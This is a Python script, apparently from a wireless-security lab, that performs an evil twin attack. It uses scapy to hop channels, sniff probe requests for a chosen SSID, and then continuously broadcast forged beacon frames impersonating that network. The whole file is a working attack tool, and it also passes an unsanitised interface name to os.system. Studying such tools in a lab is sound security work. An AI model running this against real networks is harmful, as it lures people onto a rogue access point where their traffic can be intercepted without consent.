import argparse
from scapy.all import *
from scapy.layers.dot11 import Dot11ProbeReq, Dot11Elt, Dot11, Dot11Beacon, RadioTap
from uuid import getnode as get_mac

ssid_wanted = ""
packet_ssid = None

def askUser():
    '''
    Methode demandant l'accord de l'utilisateur pour effectuer l'evil twin attack
    '''
    resp = input("SSID found ! Do you want to perform an evil twin attack ? [Y/N]").lower()
    return resp == "y"

def attack(packet_ssid, interface):
    '''
    Méthode permettant d'effectuer l'evil twin attaque à partir d'une probe request.
    :packet_ssid: Paquet contenant la probe request
    :interface: Interface avec laquelle l'attaque sera effectuée
    '''
    # Demande l'accord de l'utilisateur
    if not askUser():
        print("Exiting ....")
        exit()

    # Récupère le SSID à usurper
    ssid = packet_ssid.getlayer(Dot11).info.decode("utf-8")
    print("Attacking SSID with the name %s" % ssid)
    print("Generating the frames....")

    # Récupère la MAC adresse de l'interface et l'affiche
    mac = "".join(c + ":" if i % 2 else c for i, c in enumerate(hex(get_mac())[2:].zfill(12)))[:-1]
    print(mac)

    # Génère les frames beacon pour effectuer une evil twin attack
    frames = []
    frames.append(generateFrame(ssid, mac))
    print("Starting the attack.... (CTRL + C TO ABORT)")

    # On envoit les packets en boucle, à intervalle de 0.001
    sendp(frames, inter=0.001, iface=interface, loop=1)

def generateFrame(wifiName, macAddr):
    '''
    Méthode permettant de générer des frames de beacon à partir d'un nom et d'une MAC adresse
    :wifiName: Le nom du wifi à usurper
    :macAddr: La mac adresse à incorporer
    '''
    #creation de la frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=macAddr, addr3=macAddr)
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=wifiName, len=len(wifiName))
    frame = RadioTap() / dot11 / beacon / essid
    return frame

def scanSSIDs(packet):
    '''
    Méthode permettant de scanner les SSIDs
    :packet: Paquet à analyser
    '''
    global packet_ssid

    # On recupere le ssid
    ssid = packet.getlayer(Dot11).info.decode("utf-8")

    # Si voulu est dans le paquet
    if ssid_wanted in ssid:
        packet_ssid = packet


if __name__ == "__main__":
    global ssid
    # Argument à parser
    parser = argparse.ArgumentParser(description="Probe request evil twin attack script.")
    parser.add_argument("--interface", required=True, help="Interface used to listen to Wifi")
    parser.add_argument("--ssid", required=True, help="Name of the SSID to be looking for")
    args = parser.parse_args()

    # L'interface et le SSID
    interface = args.interface
    ssid_wanted = args.ssid

    print("Sniffing...")
    channel = 0

    # Channel hopping
    for channel in range(1, 14):
        os.system("iwconfig " + interface + " channel " + str(channel))
        # Sniff les paquets et on trie directement les probes request
        sniff(iface=interface, prn=scanSSIDs, timeout=15, lfilter=lambda p: Dot11ProbeReq in p and Dot11Elt in p)
        # Si on trouve un packet, arrête de chercher
        if packet_ssid != None:
            break

    # Si un packet a été trouvé, lance l'attaque sinon quitte
    if packet_ssid != None:
        attack(packet_ssid, interface)
    else:
        print("SSID not found !!")
